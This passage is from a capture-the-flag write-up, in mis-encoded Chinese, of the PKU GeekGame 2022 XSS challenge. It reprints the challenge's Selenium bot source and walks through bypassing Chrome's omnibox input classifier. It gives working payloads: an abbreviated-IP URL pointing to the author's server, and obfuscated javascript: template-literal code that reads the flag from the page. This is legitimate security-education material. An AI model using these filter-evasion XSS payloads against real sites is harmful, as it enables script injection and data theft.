<p>æ²¡æœ‰æ°è…¾è®¯çˆ¸çˆ¸çš„é¥­ï¼Œç¬‘æ­»äº†</p>
<h3 id="ç»™é’±ä¸è¦ï¼"><a href="#ç»™é’±ä¸è¦ï¼" class="headerlink" title="ç»™é’±ä¸è¦ï¼"></a>ç»™é’±ä¸è¦ï¼</h3><blockquote>
<blockquote>
<p>ç»™é’±ä¸è¦ï¼Œè¦é’±ä¸ç»™ï¼Œä¿¡æ¯ä¸æ¼ï¼</p>
<p>Give money no need. Need money no give. Information no leak.</p>
</blockquote>
<p>You é…±æ˜¯ GeekGame æ¯”èµ›çš„èµ„æ·±å‘½é¢˜äººï¼Œå¥¹æ·±çŸ¥â€œäººâ€æ˜¯ä¿¡æ¯å®‰å…¨ä¸­æœ€è–„å¼±çš„ç¯èŠ‚ï¼Œäººçš„ä½¿ç”¨ä¹ æƒ¯èƒœè¿‡ä¸€åˆ‡å®‰å…¨æªæ–½ã€‚æ¯•ç«Ÿç”µè„‘åªè¦ä¸å¼€æœºå°±ä¸ä¼šä¸­æ¯’ï¼Œ<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1GJ411x7h7/">é“¾æ¥</a>åªè¦ä¸ç‚¹å°±ä¸ä¼šè¢«éª—ã€‚</p>
<p>è¯è™½å¦‚æ­¤ï¼Œä½†å¥¹æœ€è¿‘æ²‰è¿·äºæ”¶é›†ç–¯ç‹‚æ˜ŸæœŸå››è¡¨æƒ…åŒ…ã€‚èº«ä¸ºè¶…çº§å˜¿å®¢çš„ä½ å¶ç„¶å‘ç°å¥¹ç»å¸¸ä½¿ç”¨çš„è¡¨æƒ…åŒ…ä¸‹è½½ç½‘ç«™å­˜åœ¨ä¸€ç§ XSS æ¼æ´ï¼Œåªè¦åœ¨ç½‘ç«™ä¸Šè¾“å…¥ä¸€ä¸²å­—ç¬¦å°±å¯ä»¥æ³„éœ²å¥¹çè—çš„ Flagã€‚ ä¸ºäº†å®è´µçš„å¥–é‡‘ï¼Œä½ å†³å®šè¯•è¯•çœ‹å¥¹åœ¨é­…åŠ›åè¶³çš„ç–¯ç‹‚æ˜ŸæœŸå››é¢å‰è¿˜èƒ½å¦ä¿æŒç†æ€§ã€‚</p>
<p>é²è½çš„æ”»å‡»è¡Œä¸ºæ€»æ˜¯ä¼´éšç€é£é™©ï¼šå¦‚æœ You é…±è§‰å¾—ä½ å‘ç»™å¥¹çš„å­—ç¬¦ä¸²å¾ˆå¯ç–‘ï¼Œæœºæ™ºçš„å¥¹å°±ä¼šç«‹åˆ»å°†ä½ ä¸¾æŠ¥åˆ°ä¿å«éƒ¨ï¼Œç„¶åå¾ˆå¿«å°±ä¼šæœ‰éª‘ç€ç™½è‰²é«˜çº§ç”µç“¶è½¦çš„ä¿å®‰å‡ºç°åœ¨æ¥¼ä¸‹å°†ä½ å¸¦èµ°ã€‚è¿™å¯å°±é­äº†ã€‚</p>
<p><strong>è¡¥å……è¯´æ˜ï¼š</strong>å®Œå…¨æ²¡æœ‰æ€è·¯å¯ä»¥çœ‹çœ‹ Chrome åœ°å€æ è‡ªåŠ¨è¡¥å…¨çš„ç›¸å…³æºç ã€‚ä¸çœ‹æºç çš„è¯ï¼Œæˆ–è®¸çµæ„Ÿ + ä¸€å®šç¨‹åº¦çš„ Fuzz ä¹Ÿèƒ½èµ·åˆ°æ•ˆæœã€‚</p>
<p><strong>èŒæ–°æ•™å­¦ï¼š</strong></p>
<p>æœ¬é¢˜æä¾›äº†ä¸€ä¸ªæ¨¡æ‹Ÿå—å®³è€…è¡Œä¸ºçš„ç¨‹åºï¼Œç§°ä¸º XSS Botã€‚XSS Bot ä¼šè‡ªåŠ¨æ“ä½œæµè§ˆå™¨å°† Flag æ”¾ç½®åœ¨ç›®æ ‡ç½‘ç«™ä¸Šï¼Œç„¶åè¾“å…¥ä½ æä¾›çš„å­—ç¬¦ä¸²ã€‚</p>
<p>è¯·è®¾æ³•åˆ©ç”¨ç›®æ ‡ç½‘ç«™ä¸Šçš„æ¼æ´ï¼Œè·å¾—å—å®³è€…æµè§ˆå™¨ä¸­çš„ Flagã€‚</p>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob06-vuln.geekgame.pku.edu.cn/">è®¿é—®ç›®æ ‡ç½‘ç«™</a></p>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob06.geekgame.pku.edu.cn/?token=xxxxxxxxx">æ‰“å¼€ç½‘é¡µç»ˆç«¯</a> æˆ–è€…é€šè¿‡å‘½ä»¤ <code>nc prob06.geekgame.pku.edu.cn 10006</code> è¿æ¥åˆ° XSS Bot</p>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob06/prob06-xssbot.py">ä¸‹è½½ XSS Bot æºç </a></p>
</blockquote>
<blockquote>
<p><strong>ç¬¬äºŒé˜¶æ®µæç¤ºï¼š</strong></p>
<ul>
<li>æ¥çœ‹çœ‹ <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235">Chrome æ˜¯å¦‚ä½•è§£æåœ°å€æ è¾“å…¥çš„å†…å®¹çš„</a>ã€‚</li>
<li>Flag 1ï¼šè¯•ç€è®© Chrome æŠŠä¸€ä¸ªä»»æ„çš„ IP åœ°å€è§£ææˆ QUERYã€‚</li>
<li>Flag 2ï¼šè¯•ç€è®© Chrome æŠŠä¸€ä¸ª Bookmarklet è§£ææˆ UNKNOWNã€‚</li>
</ul>
</blockquote>
<h4 id="è¦é’±ä¸ç»™ï¼ï¼"><a href="#è¦é’±ä¸ç»™ï¼ï¼" class="headerlink" title="è¦é’±ä¸ç»™ï¼ï¼"></a>è¦é’±ä¸ç»™ï¼ï¼</h4><p>xss bot:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># pip3 install selenium</span>
<span class="token comment"># you also need a chromedriver according to your chrome version, available at https://chromedriver.chromium.org/downloads</span>

<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">from</span> enum <span class="token keyword">import</span> Enum
<span class="token keyword">import</span> time

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> flag <span class="token keyword">import</span> getflag
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>
            <span class="token string">'fake{congrats, now get flag 1 from the real xss bot}'</span><span class="token punctuation">,</span>
            <span class="token string">'fake{congrats, now get flag 2 from the real xss bot}'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">[</span>index<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

VULN_URL <span class="token operator">=</span> <span class="token string">'http://prob06-vuln.geekgame.pku.edu.cn'</span>

<span class="token keyword">def</span> <span class="token function">remove_protocols</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> prefix <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'http://'</span><span class="token punctuation">,</span> <span class="token string">'https://'</span><span class="token punctuation">,</span> <span class="token string">'file://'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> t<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> t<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> t

<span class="token keyword">class</span> <span class="token class-name">SafetyLevel</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dangerous <span class="token operator">=</span> <span class="token number">1</span>
    safe <span class="token operator">=</span> <span class="token number">2</span>
    very_safe <span class="token operator">=</span> <span class="token number">3</span>

<span class="token keyword">def</span> <span class="token function">check_safety</span><span class="token punctuation">(</span>driver<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'%'</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>dangerous
    
    text <span class="token operator">=</span> remove_protocols<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    
    driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'chrome://omnibox'</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
    
    shadow <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'omnibox-input'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
    shadow<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'zero-suggest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
    shadow<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'input-text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
    
    result <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token comment"># it looks stupid that chrome://omnibox uses so many shadow doms :(</span>
        driver
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'omnibox-output'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'css selector'</span><span class="token punctuation">,</span> <span class="token string">'output-results-group'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'css selector'</span><span class="token punctuation">,</span> <span class="token string">'output-results-details'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> result<span class="token operator">==</span><span class="token string">'query'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>very_safe
    <span class="token keyword">elif</span> result<span class="token operator">==</span><span class="token string">'unknown'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>safe
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>dangerous

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nYOU-Chan is going to visit a vulnerable website:'</span><span class="token punctuation">,</span> VULN_URL<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Send some text to YOU-Chan, and she will paste it in that website.'</span><span class="token punctuation">)</span>
    
    text <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">&lt;=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">0x7e</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> text<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">4000</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nStarting up her browser...'</span><span class="token punctuation">)</span>
    
    options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">)</span> <span class="token comment"># sandbox not working in docker :(</span>
    options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">'excludeSwitches'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'enable-logging'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span> <span class="token keyword">as</span> driver<span class="token punctuation">:</span>
        ua <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return navigator.userAgent'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'She is using:'</span><span class="token punctuation">,</span> ua<span class="token punctuation">)</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nFirst of all, she checks the safety of your text,'</span><span class="token punctuation">)</span>
        safety <span class="token operator">=</span> check_safety<span class="token punctuation">(</span>driver<span class="token punctuation">,</span> text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  which is %s.'</span><span class="token operator">%</span>safety<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> safety<span class="token operator">==</span>SafetyLevel<span class="token punctuation">.</span>dangerous<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nShe feels afraid because of this.'</span><span class="token punctuation">)</span>
            <span class="token keyword">assert</span> <span class="token boolean">False</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nThen she visits the vulnerable website,'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>VULN_URL<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  and put her flag for you.'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'document.querySelector(".flag").textContent = "%s"'</span><span class="token operator">%</span>getflag<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nNow she pastes your text into the text field,'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  and clicks on the button.'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'go'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        
        title <span class="token operator">=</span> driver<span class="token punctuation">.</span>title
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nThe page title is:'</span><span class="token punctuation">,</span> title<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> safety<span class="token operator">==</span>SafetyLevel<span class="token punctuation">.</span>very_safe <span class="token keyword">and</span> title<span class="token operator">==</span><span class="token string">'GIVE-ME-FLAG-1 #=_= @!+!@ ^~^ %[*.*]%'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  so here is your flag 1:'</span><span class="token punctuation">,</span> getflag<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nSee you later :)'</span><span class="token punctuation">)</span>
    
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ERROR'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#raise</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‰ç«¯ï¼š</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231175527246.png"></p>
<p>é¡µé¢ä¸Šè¿™é‡Œä¼šæŠŠè¾“å…¥çš„å†…å®¹ç›´æ¥æ‹¼æ¥åˆ° <code>location.href</code> é‡Œï¼Œä»è€Œé€ æˆ XSS</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    location<span class="token punctuation">.</span>href <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">'.jpg'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>éš¾ç‚¹åœ¨äºéœ€è¦è®© chrome çš„åœ°å€æ å°†æˆ‘ä»¬çš„è¾“å…¥è§£æä¸º unknown ç”šè‡³æ˜¯ query </p>
<p>è¿™ä¸ªçš„åˆ¤æ–­ç”¨åˆ°äº† <code>chrome://omnibox</code> é‡Œçš„è¿™ä¸ª type</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122052020723.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122052041306.png"></p>
<p>ç›¸å…³çš„æºç  <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235">åœ¨è¿™é‡Œ</a></p>
<p>IP åœ°å€ç›¸å…³ï¼Œå¯ä»¥çœ‹å‡ºå¦‚æœæ˜¯ä¸å®Œæ•´çš„ IP ä¹Ÿä¼šå°è¯•å»è§£æ</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231180853314.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231180953125.png"></p>
<p>ä½†æ˜¯å–µå–µæ„é€ äº†è€åŠå¤©ä¹Ÿå¼„ä¸å‡ºæ¥èƒ½è®©ä»–è¯†åˆ«æˆ QUERY çš„ payloadâ€¦â€¦</p>
<p><a target="_blank" rel="noopener" href="https://prob06-vuln.geekgame.pku.edu.cn/how_to_get_flag.jpg">https://prob06-vuln.geekgame.pku.edu.cn/how_to_get_flag.jpg</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122051432971.png"></p>
<p>çœ‹äº†å®˜æ–¹ wpï¼Œæ‰çŸ¥é“åŸæ¥è¿˜èƒ½ç‚¹åˆ†ï¼Œä½†æ²¡æœ‰å®Œå…¨ç‚¹åˆ†ï¼ˆï¼Ÿï¼Ÿï¼Ÿ</p>
<blockquote>
<p>ä¾‹å¦‚ï¼Œä»¥ä¸‹æ‰€æœ‰ URL éƒ½æ˜¯ç­‰ä»·çš„ï¼Œä¸ä¿¡ä½ å°±æŠŠå®ƒè¾“å…¥è¿› Chrome è¯•è¯•çœ‹ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://12.34.56.78</a>  ï¼ˆç‚¹åˆ†åè¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://0xc.0x22.0x38.0x4e</a>  ï¼ˆç‚¹åˆ†åå…­è¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://014.042.070.0116</a> ï¼ˆç‚¹åˆ†å…«è¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://12.0x22.070.78</a> ï¼ˆç‚¹åˆ†åã€åå…­ã€å…«ã€åè¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://203569230</a> ï¼ˆåè¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://0xc22384e</a> ï¼ˆåå…­è¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://01410434116</a> ï¼ˆå…«è¿›åˆ¶ï¼‰</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://12.2242638</a> ï¼ˆç‚¹åˆ†ï¼Œä½†æ²¡æœ‰å®Œå…¨ç‚¹åˆ†ï¼‰</li>
</ul>
</blockquote>
<p>2242638 ä¹Ÿå°±æ˜¯ <code>78 + 56*256 + 34*256*256</code></p>
<p>äºæ˜¯å¯ä»¥æ„é€ ä¸ªè‡ªå·± VPS IP + port çš„ payloadï¼Œæ¯”å¦‚ </p>
<pre class="line-numbers language-none"><code class="language-none">http://47.2242638:1234?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<!-- http://47.6333594:1234? -->

<p>åœ¨ vps ä¸Šæ”¾ä¸ªä¸‹é¢å†…å®¹çš„é¡µé¢</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>GIVE-ME-FLAG-1 #=_= @!+!@ ^~^ %[*.*]%<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>miaotony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åè¯•ä¸€è¯•</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231182543190.png"></p>
<p>è¿™å°±èƒ½æ‹¿åˆ° flag1 äº†ã€‚</p>
<h4 id="ä¿¡æ¯ä¸æ¼ï¼ï¼ï¼"><a href="#ä¿¡æ¯ä¸æ¼ï¼ï¼ï¼" class="headerlink" title="ä¿¡æ¯ä¸æ¼ï¼ï¼ï¼"></a>ä¿¡æ¯ä¸æ¼ï¼ï¼ï¼</h4><p>è¿˜æ˜¯å›´ç»•å¯¹ JavaScript çš„ç‰¹åˆ¤æ¥çœ‹</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Treat javascript: scheme queries followed by things that are unlikely to</span>
<span class="token comment">// be code as UNKNOWN, rather than script to execute (URL).</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>RE2<span class="token operator">::</span><span class="token function">FullMatch</span><span class="token punctuation">(</span>base<span class="token operator">::</span><span class="token function">UTF16ToUTF8</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"(?i)javascript:([^;=().\"]*)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> metrics<span class="token operator">::</span>OmniboxInputType<span class="token operator">::</span>UNKNOWN<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>éœ€è¦æ»¡è¶³è¿™ä¸ª æ­£åˆ™è¡¨è¾¾å¼ çš„è¾“å…¥æ‰èƒ½æ˜¯ UNKNOWN</p>
<p>æ ¹æ®å®˜æ–¹ wpï¼Œåˆ©ç”¨åå¼•å·å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span>open<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">javascript:alert\x281\x29</span><span class="token template-punctuation string">`</span></span>
<span class="token literal-property property">javascript</span><span class="token operator">:</span>setTimeout<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert\x281\x29</span><span class="token template-punctuation string">`</span></span>
<span class="token literal-property property">javascript</span><span class="token operator">:</span>eval<span class="token punctuation">[</span><span class="token string">'call'</span><span class="token punctuation">]</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token string">'alert\x281\x29'</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
<span class="token literal-property property">javascript</span><span class="token operator">:</span>Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert\x281\x29</span><span class="token template-punctuation string">`</span></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>äºæ˜¯å¯ä»¥è¯•è¯•æŠŠ title ç»™è®¾ç½®ä¸ºé¡µé¢é‡Œçš„ flagï¼Œå°±èƒ½å°† flag å¸¦å‡ºæ¥äº†ã€‚</p>
<p>æ„é€  payloadï¼Œå‰é¢çš„åå¼•å·æ„é€ äº†ä¸ªåŒ¿åå‡½æ•°ï¼Œæœ€åçš„ä¸¤ä¸ªåå¼•å·åº”è¯¥ç›¸å½“äº <code>()</code> ç«‹å³æ‰§è¡Œçš„æ„æ€</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span>Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">document\x2etitle\x3ddocument\x2equerySelector\x28\x22\x2eflag\x22\x29\x2etextContent</span><span class="token template-punctuation string">`</span></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231184219125.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231184235336.png"></p>
<blockquote>
<p>æˆ–è€…è¿˜å¯ä»¥åˆ©ç”¨ <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bookmarklet">Bookmarklet çš„ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„ç‰¹æ€§</a>ï¼šå¦‚æœ <code>javascript:</code> åé¢çš„å†…å®¹æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒå°±ä¼šè¢«æµè§ˆå™¨è§†ä¸º HTML è§£é‡Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™æˆè¿™æ ·ï¼š</p>
